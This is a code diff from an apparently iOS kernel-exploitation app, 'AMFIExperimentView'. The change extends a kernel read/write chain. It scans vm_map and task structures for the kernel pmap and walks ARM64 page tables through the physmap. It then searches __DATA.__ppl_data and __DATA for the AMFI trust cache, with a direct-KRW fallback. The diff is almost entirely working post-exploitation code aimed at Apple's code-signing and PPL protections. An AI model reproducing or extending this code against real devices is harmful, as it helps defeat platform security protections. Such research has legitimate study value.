@@ -107,6 +107,80 @@ private func isReasonablePhysTT(_ v: UInt64) -> Bool {
     v >= 0x800000000 && v < 0x1000000000
 }
 
+private func isLikelyKernelPointer(_ v: UInt64) -> Bool {
+    if v == 0 { return false }
+    if v >= 0xffffff8000000000 { return true }
+    if v >= 0xffffffdc00000000 && v < 0xffffffe600000000 { return true }
+    return false
+}
+
+/// Score pmap candidates (+0x00 tte, +0x08 ttep — Exp 75 checks +0x08 first).
+private func pmapCandidateScore(_ pmap: UInt64) -> Int {
+    guard isLikelyKernelPointer(pmap) else { return 0 }
+    var score = 1
+    let p0 = ds_kreadptr(pmap)
+    let p8 = ds_kreadptr(pmap + 8)
+    if p0 == pmap { score += 1 } // user pmap quirk; L1 may be at +0x08
+    else if isKernelOrPhysmapVA(p0) { score += 4 }
+    if isKernelOrPhysmapVA(p8) { score += 5 }
+    if isReasonablePhysTT(p8) { score += 4 }
+    if isReasonablePhysTT(p0) { score += 3 }
+    return score
+}
+
+/// Wide scan vm_map + task for pmap (kernel vm_map often ≠ +0x50 only).
+private func findPmapPointer(vmMap: UInt64, task: UInt64, detail: inout String) -> UInt64? {
+    var best: (addr: UInt64, score: Int, label: String)?
+
+    func consider(_ addr: UInt64, _ label: String) {
+        let sc = pmapCandidateScore(addr)
+        guard sc >= 3 else { return }
+        if best == nil || sc > best!.score {
+            best = (addr, sc, label)
+        }
+    }
+
+    if vmMap != 0 {
+        detail += "Scanning vm_map 0x\(String(format: "%llx", vmMap)) for pmap...\n"
+        for off in stride(from: UInt64(0), to: 0xC0, by: 8) {
+            let p = ds_kreadptr(vmMap + off)
+            if isLikelyKernelPointer(p) {
+                let sc = pmapCandidateScore(p)
+                if sc >= 3 {
+                    detail += "  map+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
+                    consider(p, "vm_map+0x\(String(format: "%x", off))")
+                }
+            }
+        }
+    }
+
+    detail += "Scanning task 0x\(String(format: "%llx", task)) for pmap...\n"
+    for off in stride(from: UInt64(0x20), to: 0x98, by: 8) {
+        let p = ds_kreadptr(task + off)
+        if isLikelyKernelPointer(p) {
+            let sc = pmapCandidateScore(p)
+            if sc >= 4 {
+                detail += "  task+0x\(String(format: "%02x", off)): 0x\(String(format: "%llx", p)) score=\(sc)\n"
+                consider(p, "task+0x\(String(format: "%x", off))")
+            }
+        }
+    }
+
+    if let b = best {
+        detail += "✅ pmap from \(b.label): 0x\(String(format: "%llx", b.addr)) (score \(b.score))\n\n"
+        return b.addr
+    }
+
+    if vmMap != 0 {
+        detail += "vm_map dump (pmap not found):\n"
+        for off in stride(from: UInt64(0), to: 0x60, by: 8) {
+            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", ds_kread64_safe(vmMap + off)))\n"
+        }
+        detail += "\n"
+    }
+    return nil
+}
+
 /// L1 page table root from pmap (+0x00 tte VA, +0x08 ttep/alt, PAC via ds_kreadptr).
 private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt64, field: String)? {
     detail += "pmap struct dump (ds_kreadptr = PAC stripped):\n"
@@ -122,8 +196,10 @@ private func resolvePmapL1Root(pmap: UInt64, detail: inout String) -> (va: UInt6
     }
     detail += "\n"
 
-    for (off, name) in [(UInt64(0), "+0x00 tte"), (UInt64(8), "+0x08 ttep/alt"), (UInt64(0x10), "+0x10")] {
+    // +0x08 first — iOS 18 / Exp 75 often has TTBR at pmap+0x08
+    for (off, name) in [(UInt64(8), "+0x08 ttep/alt"), (UInt64(0), "+0x00 tte"), (UInt64(0x10), "+0x10")] {
         let v = ds_kreadptr(pmap + off)
+        if v == pmap { continue }
         if isKernelOrPhysmapVA(v) {
             detail += "✅ L1 root from \(name): 0x\(String(format: "%llx", v))\n"
             return (v, name)
@@ -224,18 +300,8 @@ private func resolveKernelPmapChain(detail: inout String) -> KernelPmapChain? {
         return nil
     }
 
-    var pmap: UInt64 = 0
-    for off: UInt64 in [0x48, 0x50, 0x58, 0x40] {
-        let p = ds_kread64_safe(vmMap + off)
-        if p != 0 && p > 0xffffffdc00000000 {
-            pmap = p
-            detail += "kernel pmap (+0x\(String(format: "%x", off))): 0x\(String(format: "%llx", p))\n"
-            break
-        }
-    }
-
-    guard pmap != 0 else {
-        detail += "❌ kernel pmap not found on vm_map\n"
+    guard let pmap = findPmapPointer(vmMap: vmMap, task: task, detail: &detail) else {
+        detail += "❌ kernel pmap not found (wide scan vm_map+task)\n"
         return nil
     }
 
@@ -3960,16 +4026,25 @@ struct AMFIExperimentView: View {
         detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
         
         // ============================================================
-        // STEP 1: Kernel pmap L1 (tte) — MUST be kernproc, not our_proc
+        // STEP 1: Kernel pmap L1 (kernproc) — wide scan vm_map + task
         // ============================================================
         detail += "=== Step 1: Kernel page table root (kernproc pmap) ===\n"
 
-        guard let kPmap = resolveKernelPmapChain(detail: &detail) else {
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        var tteBase: UInt64 = 0
+        var usePageTableWalk = false
+
+        if let kPmap = resolveKernelPmapChain(detail: &detail) {
+            tteBase = kPmap.tte
+            usePageTableWalk = true
+        } else {
+            detail += "\n⚠️ Kernel pmap chain failed.\n"
+            if PhysmapConstants.isVerified {
+                detail += "Exp 74 verified — akan coba direct KRW + __DATA scan (tanpa PT walk).\n\n"
+            } else {
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            }
         }
 
-        let tteBase = kPmap.tte
-        
         // ============================================================
         // STEP 2: Find trust cache in __DATA.__ppl_data via physmap READ
         // __DATA.__ppl_data starts at __DATA+0x8000
@@ -4007,94 +4082,67 @@ struct AMFIExperimentView: View {
         // Kernel is at 0xfffffff0... while physmap is at 0xffffffde...
         // We need page table walk to find the physical address of __DATA.__ppl_data
         
-        detail += "\n=== Page Table Walk for __DATA.__ppl_data ===\n"
-        detail += "Target VA: 0x\(String(format: "%llx", pplDataBase))\n"
-        
-        // iOS 18.2 A12 uses 16KB pages (granule = 14 bits)
-        // 3-level translation: L1[2:0] → L2[10:0] → L3[10:0] → page
-        // VA bits: [38:36]=L1, [35:25]=L2, [24:14]=L3, [13:0]=offset
-        // (39-bit VA space with 16KB granule)
-        
-        let targetVA = pplDataBase
-        let l1Idx = (targetVA >> 36) & 0x7      // 3 bits
-        let l2Idx = (targetVA >> 25) & 0x7FF    // 11 bits
-        let l3Idx = (targetVA >> 14) & 0x7FF    // 11 bits
-        let pageOff = targetVA & 0x3FFF         // 14 bits (16KB)
-        
-        detail += "L1 idx: \(l1Idx), L2 idx: \(l2Idx), L3 idx: \(l3Idx)\n"
-        detail += "Page offset: 0x\(String(format: "%x", pageOff))\n\n"
-        
-        // Read L1 entry from tte base
-        // tte is a kernel VA in zone range → readable via ds_kread64
-        let l1EntryAddr = tteBase + l1Idx * 8
-        let l1Entry = ds_kread64_safe(l1EntryAddr)
-        detail += "L1[\\(l1Idx)] at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
-        
-        guard l1Entry & 0x3 == 0x3 else {
-            detail += "❌ L1 entry invalid (not table descriptor)\n"
-            detail += "Bits [1:0] = 0x\(String(format: "%x", l1Entry & 0x3)) (need 0x3 for table)\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
+        if usePageTableWalk {
+            detail += "\n=== Page Table Walk for __DATA.__ppl_data ===\n"
+            detail += "Target VA: 0x\(String(format: "%llx", pplDataBase))\n"
+            detail += "L1 root: 0x\(String(format: "%llx", tteBase))\n"
 
-        // L1 → L2 table physical address (bits [47:14] for 16KB granule)
-        let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
-        // Convert physical to physmap VA for reading
-        let l2TableVA = l2TablePhys &- gPhysBase &+ gVirtBase
-        detail += "L2 table phys: 0x\(String(format: "%llx", l2TablePhys))\n"
-        detail += "L2 table physmap VA: 0x\(String(format: "%llx", l2TableVA))\n"
-        
-        let l2EntryAddr = l2TableVA + l2Idx * 8
-        let l2Entry = ds_kread64_safe(l2EntryAddr)
-        detail += "L2[\(l2Idx)] at 0x\(String(format: "%llx", l2EntryAddr)): 0x\(String(format: "%llx", l2Entry))\n"
-        
-        guard l2Entry & 0x3 == 0x3 else {
-            detail += "❌ L2 entry invalid (not table descriptor)\n"
-            // Maybe it's a block entry (1GB or 32MB block)
-            if l2Entry & 0x3 == 0x1 {
-                detail += "L2 is BLOCK entry (32MB mapping)\n"
-                let blockPhys = l2Entry & 0x0000FFFFFE000000
-                let targetPhys = blockPhys | (targetVA & 0x1FFFFFF)
-                detail += "Block phys: 0x\(String(format: "%llx", blockPhys))\n"
-                detail += "Target phys: 0x\(String(format: "%llx", targetPhys))\n"
+            let targetVA = pplDataBase
+            let l1Idx = (targetVA >> 36) & 0x7
+            let l2Idx = (targetVA >> 25) & 0x7FF
+            let l3Idx = (targetVA >> 14) & 0x7FF
+            let pageOff = targetVA & 0x3FFF
+
+            detail += "L1 idx: \(l1Idx), L2 idx: \(l2Idx), L3 idx: \(l3Idx)\n"
+            detail += "Page offset: 0x\(String(format: "%x", pageOff))\n\n"
+
+            let l1EntryAddr = tteBase + l1Idx * 8
+            let l1Entry = ds_kread64_safe(l1EntryAddr)
+            detail += "L1[\(l1Idx)] at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"
+
+            guard l1Entry & 0x3 == 0x3 else {
+                detail += "❌ L1 entry invalid (bits [1:0]=0x\(String(format: "%x", l1Entry & 0x3)))\n"
+                detail += "Fallback: direct __DATA scan...\n\n"
+                usePageTableWalk = false
+            } else {
+                let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
+                let l2TableVA = l2TablePhys &- gPhysBase &+ gVirtBase
+                let l2Entry = ds_kread64_safe(l2TableVA + l2Idx * 8)
+                detail += "L2[\(l2Idx)]: 0x\(String(format: "%llx", l2Entry))\n"
+
+                if l2Entry & 0x3 == 0x3 {
+                    let l3TablePhys = l2Entry & 0x0000FFFFFFFC0000
+                    let l3TableVA = l3TablePhys &- gPhysBase &+ gVirtBase
+                    let l3Entry = ds_kread64_safe(l3TableVA + l3Idx * 8)
+                    if l3Entry & 0x3 == 0x3 {
+                        let pplPagePhys = l3Entry & 0x0000FFFFFFFC0000
+                        let pplPhysmapVA = pplPagePhys &- gPhysBase &+ gVirtBase &+ pageOff
+                        detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
+                        detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
+                        let physmapRead = ds_kread64_safe(pplPhysmapVA)
+                        detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n\n"
+                    } else {
+                        detail += "❌ L3 invalid — fallback direct scan\n\n"
+                        usePageTableWalk = false
+                    }
+                } else {
+                    detail += "❌ L2 invalid — fallback direct scan\n\n"
+                    usePageTableWalk = false
+                }
             }
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
         }
 
-        // L2 → L3 table physical address
-        let l3TablePhys = l2Entry & 0x0000FFFFFFFC0000
-        let l3TableVA = l3TablePhys &- gPhysBase &+ gVirtBase
-        detail += "L3 table phys: 0x\(String(format: "%llx", l3TablePhys))\n"
-        detail += "L3 table physmap VA: 0x\(String(format: "%llx", l3TableVA))\n"
-        
-        let l3EntryAddr = l3TableVA + l3Idx * 8
-        let l3Entry = ds_kread64_safe(l3EntryAddr)
-        detail += "L3[\(l3Idx)] at 0x\(String(format: "%llx", l3EntryAddr)): 0x\(String(format: "%llx", l3Entry))\n"
-        
-        guard l3Entry & 0x3 == 0x3 else {
-            detail += "❌ L3 entry invalid (not page descriptor)\n"
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
-        }
-
-        // L3 → physical page (bits [47:14] for 16KB page)
-        let pplPagePhys = l3Entry & 0x0000FFFFFFFC0000
-        let pplPhysmapVA = pplPagePhys &- gPhysBase &+ gVirtBase &+ pageOff
-        
-        detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
-        detail += "PPL page physical: 0x\(String(format: "%llx", pplPagePhys))\n"
-        detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
-        detail += "AP bits: \((l3Entry >> 6) & 0x3)\n\n"
-        
-        // Verify: read through physmap should give same data as direct read
-        let directRead = ds_kread64_safe(pplDataBase)
-        let physmapRead = ds_kread64_safe(pplPhysmapVA)
-        detail += "Direct read (may fail/0): 0x\(String(format: "%llx", directRead))\n"
-        detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n"
-        
-        if physmapRead == 0 && directRead == 0 {
-            detail += "⚠️ Both reads are 0 — offset might be wrong\n"
-            detail += "Trying scan from __DATA base...\n\n"
-        } else {
-            detail += "✅ Physmap read successful!\n\n"
+        if !usePageTableWalk {
+            let directRead = ds_kread64_safe(pplDataBase)
+            detail += "=== Direct KRW probe (__ppl_data) ===\n"
+            detail += "pplDataBase: 0x\(String(format: "%llx", pplDataBase))\n"
+            detail += "Direct read: 0x\(String(format: "%llx", directRead))\n"
+            if directRead == 0 {
+                detail += "(0 = zone/PPL block — scan __DATA.__data below)\n"
+            } else {
+                detail += "✅ Direct read OK\n"
+            }
+            detail += "\n"
         }
         
         // ============================================================
@@ -4107,72 +4155,68 @@ struct AMFIExperimentView: View {
         var tcEntryCount: UInt64 = 0
         var tcPhysmapBase: UInt64 = 0
         
-        // Walk multiple pages of __DATA.__ppl_data via page table
-        // Scan 16 pages (256KB) of PPL data
-        for pageIdx in 0..<16 {
-            let scanVA = pplDataBase &+ UInt64(pageIdx) * 0x4000
-            
-            // Walk page table for this VA
-            let sL1Idx = (scanVA >> 36) & 0x7
-            let sL2Idx = (scanVA >> 25) & 0x7FF
-            let sL3Idx = (scanVA >> 14) & 0x7FF
-            
-            let sL1E = ds_kread64_safe(tteBase + sL1Idx * 8)
-            guard sL1E & 0x3 == 0x3 else { continue }
-            
-            let sL2Phys = sL1E & 0x0000FFFFFFFC0000
-            let sL2VA = sL2Phys &- gPhysBase &+ gVirtBase
-            let sL2E = ds_kread64_safe(sL2VA + sL2Idx * 8)
-            guard sL2E & 0x3 == 0x3 else { continue }
-            
-            let sL3Phys = sL2E & 0x0000FFFFFFFC0000
-            let sL3VA = sL3Phys &- gPhysBase &+ gVirtBase
-            let sL3E = ds_kread64_safe(sL3VA + sL3Idx * 8)
-            guard sL3E & 0x3 == 0x3 else { continue }
-            
-            let pagePhys = sL3E & 0x0000FFFFFFFC0000
-            let pagePhysmapVA = pagePhys &- gPhysBase &+ gVirtBase
-            
-            // Scan this page for trust cache pattern
-            for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
-                let val = ds_kread64_safe(pagePhysmapVA + off)
-                
-                // Trust cache pattern: pointer to struct with version(1-3) + count(1-50000)
-                if val > 0xffffffdc00000000 && val < 0xffffffe500000000 {
-                    let tcVer = ds_kread32_safe(val)
-                    let tcCnt = ds_kread32_safe(val + 4)
-                    if tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 {
-                        detail += "🎯 Trust cache at page \(pageIdx) +0x\(String(format: "%x", off))!\n"
-                        detail += "  ptr: 0x\(String(format: "%llx", val))\n"
-                        detail += "  version: \(tcVer), count: \(tcCnt)\n"
-                        detail += "  physmap page VA: 0x\(String(format: "%llx", pagePhysmapVA))\n"
-                        tcStructAddr = val
-                        tcEntryCount = UInt64(tcCnt)
-                        tcPhysmapBase = pagePhysmapVA + off
+        func tryTrustCachePointer(_ val: UInt64, label: String, physmapBase: UInt64 = 0) -> Bool {
+            guard val > 0xffffffdc00000000 && val < 0xffffffe500000000 else { return false }
+            let tcVer = ds_kread32_safe(val)
+            let tcCnt = ds_kread32_safe(val + 4)
+            guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
+            detail += "🎯 Trust cache \(label)!\n"
+            detail += "  ptr: 0x\(String(format: "%llx", val))\n"
+            detail += "  version: \(tcVer), count: \(tcCnt)\n"
+            if physmapBase != 0 {
+                detail += "  physmap VA: 0x\(String(format: "%llx", physmapBase))\n"
+            }
+            tcStructAddr = val
+            tcEntryCount = UInt64(tcCnt)
+            tcPhysmapBase = physmapBase
+            return true
+        }
+
+        if usePageTableWalk && tteBase != 0 {
+            detail += "Scan via page table (16 pages)...\n"
+            for pageIdx in 0..<16 {
+                let scanVA = pplDataBase &+ UInt64(pageIdx) * 0x4000
+                let sL1Idx = (scanVA >> 36) & 0x7
+                let sL2Idx = (scanVA >> 25) & 0x7FF
+                let sL3Idx = (scanVA >> 14) & 0x7FF
+                let sL1E = ds_kread64_safe(tteBase + sL1Idx * 8)
+                guard sL1E & 0x3 == 0x3 else { continue }
+                let sL2VA = (sL1E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
+                let sL2E = ds_kread64_safe(sL2VA + sL2Idx * 8)
+                guard sL2E & 0x3 == 0x3 else { continue }
+                let sL3VA = (sL2E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
+                let sL3E = ds_kread64_safe(sL3VA + sL3Idx * 8)
+                guard sL3E & 0x3 == 0x3 else { continue }
+                let pagePhysmapVA = (sL3E & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase
+                for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
+                    let val = ds_kread64_safe(pagePhysmapVA + off)
+                    if tryTrustCachePointer(val, label: "PT page \(pageIdx)+0x\(String(format: "%x", off))", physmapBase: pagePhysmapVA + off) {
                         break
                     }
                 }
+                if tcStructAddr != 0 { break }
             }
-            if tcStructAddr != 0 { break }
+        } else {
+            detail += "Direct KRW scan __ppl_data (16 pages)...\n"
+            for pageIdx in 0..<16 {
+                let scanVA = pplDataBase &+ UInt64(pageIdx) * 0x4000
+                for off in stride(from: UInt64(0), to: UInt64(0x4000), by: 8) {
+                    let val = ds_kread64_safe(scanVA + off)
+                    if tryTrustCachePointer(val, label: "direct ppl page \(pageIdx)+0x\(String(format: "%x", off))") {
+                        break
+                    }
+                }
+                if tcStructAddr != 0 { break }
+            }
         }
         
         // If not found in PPL pages, try scanning __DATA.__data (non-PPL, safe range)
         if tcStructAddr == 0 {
-            detail += "Not found in PPL pages, scanning __DATA.__data...\n"
-            let dataStart = dataSegBase
-            for off in stride(from: UInt64(0), to: UInt64(0x8000), by: 8) {
-                let val = ds_kread64_safe(dataStart + off)
-                if val > 0xffffffdc00000000 && val < 0xffffffe500000000 {
-                    let tcVer = ds_kread32_safe(val)
-                    let tcCnt = ds_kread32_safe(val + 4)
-                    if tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 {
-                        detail += "🎯 Trust cache at __DATA+0x\(String(format: "%x", off))!\n"
-                        detail += "  ptr: 0x\(String(format: "%llx", val))\n"
-                        detail += "  version: \(tcVer), count: \(tcCnt)\n"
-                        tcStructAddr = val
-                        tcEntryCount = UInt64(tcCnt)
-                        break
-                    }
+            detail += "Not found in PPL pages, scanning __DATA (512KB)...\n"
+            for off in stride(from: UInt64(0), to: UInt64(0x80000), by: 8) {
+                let val = ds_kread64_safe(dataSegBase + off)
+                if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
+                    break
                 }
             }
         }
